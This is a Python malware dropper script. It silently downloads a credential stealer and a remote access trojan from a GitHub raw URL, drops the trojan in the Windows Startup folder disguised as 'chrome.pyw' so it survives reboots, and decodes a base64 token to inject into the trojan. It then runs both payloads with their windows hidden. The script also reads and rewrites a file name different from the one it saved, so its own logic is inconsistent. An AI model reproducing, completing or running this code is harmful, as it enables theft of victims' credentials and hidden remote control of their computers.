import subprocess
import base64
import os

user_profile = os.environ.get('USERPROFILE')
user_startup = os.path.join(os.environ.get('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

login = base64.b64decode("TVRJNU1qVXhPRE15TXpjeU16azJNRE0zTWcuRzNkSVBBLnJQUUxQSTRYVGhIUzVuZmxWN05BMXdSZE9rdjV4UXBNeDBFaldJ").decode("utf-8")

subprocess.run(["curl", "https://raw.githubusercontent.com/JuanaCOrtiz/test-rep/refs/heads/main/stealer.py", "-o", f"{user_profile}\\ste.pyw"], creationflags=subprocess.CREATE_NO_WINDOW)
subprocess.run(["curl", "https://raw.githubusercontent.com/JuanaCOrtiz/test-rep/refs/heads/main/rat.py", "-o", f"{user_startup}\\chrome.pyw"], creationflags=subprocess.CREATE_NO_WINDOW)

code = ""
with open(f"{user_startup}\\rat.pyw", "r", encoding="utf-8") as f:
    code = f.read()

code = code.replace("%token%", login)

with open(f"{user_startup}\\rat.pyw", "w", encoding="utf-8") as f:
    f.write(code)

subprocess.run(["python", f"{user_profile}\\ste.pyw"], creationflags=subprocess.CREATE_NO_WINDOW)
subprocess.run(["python", f"{user_startup}\\chrome.pyw"], creationflags=subprocess.CREATE_NO_WINDOW)